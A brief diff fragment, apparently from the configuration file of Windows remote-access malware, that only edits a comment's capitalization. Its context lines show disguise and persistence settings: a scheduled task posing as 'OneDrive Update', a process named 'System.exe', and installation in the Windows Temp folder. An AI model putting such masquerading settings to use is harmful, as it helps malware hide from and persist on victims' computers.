@@ -22,7 +22,7 @@ ProcessBSODProtectionEnabled = False
 AutorunEnabled = False
 # Installation directory
 InstallPath = 'C:\\Windows\\Temp\\'
-# Task Name in Task Scheduler
+# Task name in Task Scheduler
 AutorunName = 'OneDrive Update'
 # The name of the process in the Task Manager
 ProcessName = 'System.exe'
